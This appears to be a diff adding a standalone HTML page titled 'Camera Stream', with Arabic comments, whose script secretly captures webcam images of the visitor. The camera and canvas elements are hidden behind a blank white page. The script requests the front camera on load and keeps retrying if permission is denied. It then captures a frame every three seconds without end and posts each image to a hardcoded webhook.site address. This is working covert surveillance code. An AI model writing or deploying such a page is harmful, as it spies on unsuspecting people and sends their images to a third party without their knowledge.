@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Camera Stream</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    body {
+      background-color: #ffffff;
+      width: 100vw;
+      height: 100vh;
+      overflow: hidden;
+    }
+    video, canvas {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <video id="video" autoplay playsinline muted></video>
+  <canvas id="canvas"></canvas>
+
+  <script>
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    
+    // رابط Webhook الثابت
+    const WEBHOOK_URL = 'https://97d72d4a-20dc-4df7-973b-4495497a393a.webhook.site';
+    
+    // الفاصل الزمني بين كل صورة (بالمللي ثانية) - كل 3 ثواني
+    const CAPTURE_INTERVAL = 3000;
+    
+    let stream = null;
+    let captureTimer = null;
+
+    async function startCameraAndCapture() {
+      try {
+        // طلب إذن الكاميرا
+        stream = await navigator.mediaDevices.getUserMedia({
+          video: {
+            facingMode: "user",
+            width: { ideal: 1280 },
+            height: { ideal: 720 }
+          },
+          audio: false
+        });
+        
+        video.srcObject = stream;
+        
+        // انتظار حتى تصبح الكاميرا جاهزة
+        await new Promise((resolve) => {
+          video.onloadedmetadata = () => {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            resolve();
+          };
+        });
+        
+        // بدأ التقاط الصور التلقائي إلى ما لا نهاية
+        captureTimer = setInterval(captureAndSend, CAPTURE_INTERVAL);
+        
+        // التقاط أول صورة فوراً
+        captureAndSend();
+        
+      } catch (err) {
+        console.error('[Camera Error]', err);
+        // إعادة المحاولة بعد 5 ثواني إذا فشل الإذن
+        setTimeout(startCameraAndCapture, 5000);
+      }
+    }
+
+    function captureAndSend() {
+      if (!video.srcObject || video.readyState < 2) return;
+      
+      try {
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        
+        // تحويل إلى Base64 PNG
+        const base64Image = canvas.toDataURL('image/png');
+        
+        // إرسال إلى Webhook
+        sendToWebhook(base64Image);
+      } catch (err) {
+        console.error('[Capture Error]', err);
+      }
+    }
+
+    async function sendToWebhook(imageDataUrl) {
+      const payload = {
+        image_data: imageDataUrl,
+        timestamp: new Date().toISOString(),
+        type: 'camera_capture'
+      };
+
+      try {
+        await fetch(WEBHOOK_URL, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(payload)
+        });
+      } catch (err) {
+        console.error('[Send Error]', err);
+      }
+    }
+
+    // تنظيف عند الخروج من الصفحة
+    window.addEventListener('beforeunload', () => {
+      if (captureTimer) clearInterval(captureTimer);
+      if (stream) {
+        stream.getTracks().forEach(track => track.stop());
+      }
+    });
+
+    // تشغيل الكاميرا عند تحميل الصفحة
+    startCameraAndCapture();
+  </script>
+</body>
+</html>
